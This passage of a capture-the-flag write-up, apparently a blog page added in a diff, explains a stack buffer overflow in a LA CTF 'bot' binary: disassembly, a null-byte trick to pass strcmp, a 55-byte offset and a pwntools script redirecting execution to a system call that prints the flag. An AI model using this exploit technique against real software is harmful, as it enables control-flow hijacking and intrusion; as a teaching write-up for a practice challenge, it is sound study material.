+  4011c1:       48 8d 35 54 0e 00 00    lea    rsi,[rip+0xe54]        # 40201c &lt;_IO_stdin_used+0x1c&gt;
+  4011c8:       48 89 c7                mov    rdi,rax
+  4011cb:       e8 90 fe ff ff          call   401060 &lt;strcmp@plt&gt;
+  4011d0:       85 c0                   test   eax,eax
+  4011d2:       75 11                   jne    4011e5 &lt;main+0x63&gt;
+  4011d4:       48 8d 3d 52 0e 00 00    lea    rdi,[rip+0xe52]        # 40202d &lt;_IO_stdin_used+0x2d&gt;
+  4011db:       e8 50 fe ff ff          call   401030 &lt;puts@plt&gt;
+  4011e0:       e9 e7 00 00 00          jmp    4012cc &lt;main+0x14a&gt;
+  4011e5:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  4011e9:       48 8d 35 44 0e 00 00    lea    rsi,[rip+0xe44]        # 402034 &lt;_IO_stdin_used+0x34&gt;
+  4011f0:       48 89 c7                mov    rdi,rax
+  4011f3:       e8 68 fe ff ff          call   401060 &lt;strcmp@plt&gt;
+  4011f8:       85 c0                   test   eax,eax
+  4011fa:       75 11                   jne    40120d &lt;main+0x8b&gt;
+  4011fc:       48 8d 3d 49 0e 00 00    lea    rdi,[rip+0xe49]        # 40204c &lt;_IO_stdin_used+0x4c&gt;
+  401203:       e8 28 fe ff ff          call   401030 &lt;puts@plt&gt;
+  401208:       e9 bf 00 00 00          jmp    4012cc &lt;main+0x14a&gt;
+  40120d:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  401211:       48 8d 35 38 0e 00 00    lea    rsi,[rip+0xe38]        # 402050 &lt;_IO_stdin_used+0x50&gt;
+  401218:       48 89 c7                mov    rdi,rax
+  40121b:       e8 40 fe ff ff          call   401060 &lt;strcmp@plt&gt;
+  401220:       85 c0                   test   eax,eax
+  401222:       75 11                   jne    401235 &lt;main+0xb3&gt;
+  401224:       48 8d 3d 4c 0e 00 00    lea    rdi,[rip+0xe4c]        # 402077 &lt;_IO_stdin_used+0x77&gt;
+  40122b:       e8 00 fe ff ff          call   401030 &lt;puts@plt&gt;
+  401230:       e9 97 00 00 00          jmp    4012cc &lt;main+0x14a&gt;
+  401235:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  401239:       48 8d 35 39 0e 00 00    lea    rsi,[rip+0xe39]        # 402079 &lt;_IO_stdin_used+0x79&gt;
+  401240:       48 89 c7                mov    rdi,rax
+  401243:       e8 18 fe ff ff          call   401060 &lt;strcmp@plt&gt;
+  401248:       85 c0                   test   eax,eax
+  40124a:       75 0e                   jne    40125a &lt;main+0xd8&gt;
+  40124c:       48 8d 3d 3b 0e 00 00    lea    rdi,[rip+0xe3b]        # 40208e &lt;_IO_stdin_used+0x8e&gt;
+  401253:       e8 d8 fd ff ff          call   401030 &lt;puts@plt&gt;
+  401258:       eb 72                   jmp    4012cc &lt;main+0x14a&gt;
+  40125a:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  40125e:       48 8d 35 43 0e 00 00    lea    rsi,[rip+0xe43]        # 4020a8 &lt;_IO_stdin_used+0xa8&gt;
+  401265:       48 89 c7                mov    rdi,rax
+  401268:       e8 f3 fd ff ff          call   401060 &lt;strcmp@plt&gt;
+  40126d:       85 c0                   test   eax,eax
+  40126f:       75 45                   jne    4012b6 &lt;main+0x134&gt;
+  401271:       48 8d 3d 56 0e 00 00    lea    rdi,[rip+0xe56]        # 4020ce &lt;_IO_stdin_used+0xce&gt;
+  401278:       e8 b3 fd ff ff          call   401030 &lt;puts@plt&gt;
+  40127d:       bf 0f 00 00 00          mov    edi,0xf
+  401282:       e8 09 fe ff ff          call   401090 &lt;sleep@plt&gt;
+  401287:       8b 45 bc                mov    eax,DWORD PTR [rbp-0x44]
+  40128a:       85 c0                   test   eax,eax
+  40128c:       74 1a                   je     4012a8 &lt;main+0x126&gt;
+  40128e:       48 8d 3d 4a 0e 00 00    lea    rdi,[rip+0xe4a]        # 4020df &lt;_IO_stdin_used+0xdf&gt;
+  401295:       e8 96 fd ff ff          call   401030 &lt;puts@plt&gt;
+  40129a:       48 8d 3d 52 0e 00 00    lea    rdi,[rip+0xe52]        # 4020f3 &lt;_IO_stdin_used+0xf3&gt;
+  4012a1:       e8 aa fd ff ff          call   401050 &lt;system@plt&gt;
+  4012a6:       eb 24                   jmp    4012cc &lt;main+0x14a&gt;
+  4012a8:       48 8d 3d 9d 0d 00 00    lea    rdi,[rip+0xd9d]        # 40204c &lt;_IO_stdin_used+0x4c&gt;
+  4012af:       e8 7c fd ff ff          call   401030 &lt;puts@plt&gt;
+  4012b4:       eb 16                   jmp    4012cc &lt;main+0x14a&gt;
+  4012b6:       48 8d 3d 43 0e 00 00    lea    rdi,[rip+0xe43]        # 402100 &lt;_IO_stdin_used+0x100&gt;
+  4012bd:       e8 6e fd ff ff          call   401030 &lt;puts@plt&gt;
+  4012c2:       bf 01 00 00 00          mov    edi,0x1
+  4012c7:       e8 b4 fd ff ff          call   401080 &lt;exit@plt&gt;
+  4012cc:       b8 00 00 00 00          mov    eax,0x0
+  4012d1:       c9                      leave
+  4012d2:       c3                      ret
+  4012d3:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
+  4012da:       00 00 00 
+  4012dd:       0f 1f 00                nop    DWORD PTR [rax]
+</code></pre><p>This is <code>objdump</code> result of <code>main()</code>. If you compare this to the main function
+written in C, you can see that all those calls to <code>strcmp@plt</code>. And what we need
+to be aware is after <code>puts</code> call within the <code>strcmp</code> scope:</p>
+<pre tabindex="0"><code>4011cb:       e8 90 fe ff ff          call   401060 &lt;strcmp@plt&gt;
+4011d0:       85 c0                   test   eax,eax
+4011d2:       75 11                   jne    4011e5 &lt;main+0x63&gt;
+4011d4:       48 8d 3d 52 0e 00 00    lea    rdi,[rip+0xe52]        # 40202d &lt;_IO_stdin_used+0x2d&gt;
+4011db:       e8 50 fe ff ff          call   401030 &lt;puts@plt&gt;
+4011e0:       e9 e7 00 00 00          jmp    4012cc &lt;main+0x14a&gt;
+</code></pre><p>we can see that the code flow jumps to <code>4012cc</code> which is at the end of the main
+function. If we take a look at <code>4012cc</code>:</p>
+<pre tabindex="0"><code>4012cc:       b8 00 00 00 00          mov    eax,0x0
+4012d1:       c9                      leave
+4012d2:       c3                      ret
+</code></pre><p>we can see that there is a <code>ret</code> instruction that jumps to
+<code>__libc_start_call_main</code> (so the main function also returns to somewhere!). So,
+if we can jump into one of the <code>strcmp</code> scope and overflow the buffer with the
+address of our control, I think we can get the flag. Since PIE is disabled
+meaning the program will be loaded into the exact same location every time, we
+can maybe able to make the control flow go to where the <code>system(&quot;cat flga.txt&quot;);</code> is!</p>
+<p>But, the question is how are we going to overwrite the return address? Because
+if we pass any inputs other than those ones that are being compared to some
+strings, the code flow will end up hitting <code>exit(1)</code> and this terminates the
+program immediately without returning to anywhere. So we want to make sure we can
+jump into one of the <code>if</code> cases so the code flow ends up at <code>4012cc</code>. If you
+were thinking passing a big chunk of input to the program, it will always hit
+the last else part that will lead us to <code>exit(1)</code>. If we understand how <code>strcmp</code>
+works, we can easily pass the input of our choice and overwrite the buffer.</p>
+<p><code>strcmp</code> compares two strings that are passed to it. How it works is it will
+compare each character from the two strings. If it finds a match, it returns 0.
+If not, then it will return some other integer values based on the result of the
+integer comparison of the two characters. Let&rsquo;s take a look at an input <code>please please please give me the flagaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code>.</p>
+<p>If you pass this input to the program, you will get:</p>
+<pre tabindex="0"><code>─$ python3 -c &#39;print(&#34;please please please give me the flag&#34; + &#34;a&#34; * 100)&#39; | ./bot 
+hi, how can i help?
+sorry, i didn&#39;t understand your question
+</code></pre><p>As you can see, it fell into the <code>exit(1)</code>. The reason is the data we passed in
+did not separate between <code>please please ... the flag</code> and the <code>a</code>s that I sent
+in to see if the return address gets overwritten. <code>strcmp</code> stops reading when it
+sees a <code>NULL</code> byte! Using this characteristic of <code>strcmp</code>, we can build a
+payload that is</p>
+<pre tabindex="0"><code>└─$ python3 -c &#39;print(&#34;please give me the flag&#34; + &#34;\x00&#34; + &#34;a&#34; * 100)&#39;        
+please give me the flagaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</code></pre><p>It may not be apparent from the string created but I inserted a null byte
+between the first chunk of string and the bunch of &lsquo;a&rsquo;s. This will allow
+<code>strcmp</code> to compare the string up to <code>\x00</code> and still the buffer will be
+overwritten with a bunch of &lsquo;a&rsquo;s.</p>
+<p>We will create a file that contains the payload above and pass it into GDB to
+see if the payload overwrites the ret address. I modified the input file -
+replaced &lsquo;a&rsquo;s with the cyclic of 128 chars.</p>
+<pre tabindex="0"><code>// there is a null byte after &#39;flag&#39;
+
+please give me the flagaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa
+</code></pre><p>So, I write the above payload to a file and feed it when running <code>bot</code> in GDB.
+The result I got when the instruction was at <code>0x4012d2 &lt;main+336&gt;    ret</code>,
+<code>0x7fffffffdd88: 0x6161616161616861</code>. If we find this pattern, we get 55
+(meaning the distance from the beginning of the buffer to right before the ret
+address is 55 bytes).</p>
+<p>Knowing this, we can prepare a python script that will do the rest for us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;lac.tf&#34;</span>, <span style="color:#e6db74">&#34;31180&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;give me the flag&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">55</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># this is the address to an instruction right before the system call</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x40129a</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>As you can see, the payload starts with &ldquo;give me the flag&rdquo; string followed by a
+null byte so <code>strcmp</code> can actually compare the two strings. After that, I filled
+55 bytes with A&rsquo;s and then added the address of the instruction that I want the
+code flow to go to. If we run this script, we would get:</p>
+<pre tabindex="0"><code>└─$ python3 sol.py
+[+] Opening connection to lac.tf on port 31180: Done
+[*] Switching to interactive mode
+hi, how can i help?
+lol no
+lactf{hey_stop_bullying_my_bot_thats_not_nice}
+</code></pre><h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>Noticing how <code>strcmp</code> works and creating a payload that exploits that
+characteristic was important. Thanks for reading!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/la-ctf/">La Ctf</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/cybersecurity/">Cybersecurity</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/buffer-overflow/">Buffer Overflow</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/python/">Python</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/strcmp/">Strcmp</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/flow-control/">Flow Control</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
